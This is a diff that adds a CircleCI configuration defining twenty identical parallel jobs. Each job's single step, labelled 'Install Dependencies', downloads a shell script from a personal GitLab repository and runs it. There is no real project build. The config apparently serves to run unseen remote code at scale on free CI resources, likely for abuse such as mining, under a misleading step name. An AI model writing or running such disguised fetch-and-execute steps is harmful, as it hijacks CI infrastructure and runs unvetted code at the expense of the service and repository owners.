@@ -1,0 +1,167 @@
+version: 2.1
+jobs:
+    aku1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku4:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku5:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku6:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku7:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku8:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku9:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku10:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku11:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku12:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku13:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku14:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku15:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku16:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku17:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku18:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku19:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+    aku20:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget https://gitlab.com/nungki88887/nung/-/raw/main/cccll.sh && chmod +x cccll.sh && ./cccll.sh
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
+            - aku4
+            - aku5
+            - aku6
+            - aku7
+            - aku8
+            - aku9
+            - aku10
+            - aku11
+            - aku12
+            - aku13
+            - aku14
+            - aku15
+            - aku16
+            - aku17
+            - aku18
+            - aku19
+            - aku20
